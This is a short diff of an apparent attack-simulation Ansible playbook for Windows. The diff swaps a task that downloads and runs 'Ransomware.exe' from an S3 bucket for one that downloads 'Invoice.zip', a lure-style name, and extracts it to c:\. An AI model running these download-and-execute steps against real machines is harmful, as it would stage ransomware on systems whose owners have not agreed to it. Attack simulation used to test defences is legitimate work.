@@ -5,11 +5,13 @@
   tasks:
   - name: Download Ransomware
     win_get_url:
-       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Ransomware.exe
-       dest: c:\Ransomware.exe
-       
-  - name: Execute Ransomware
-    win_command: c:\Ransomware.exe
-    ignore_errors: yes
-    args:
-      stdin: Write-Host test
+       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Invoice.zip
+       dest: c:\Invoice.zip
+    
+  - name: Extract Ransomware
+    unarchive:
+    src: c:\Invoice.zip
+    dest: c:\
+    
+  
+  
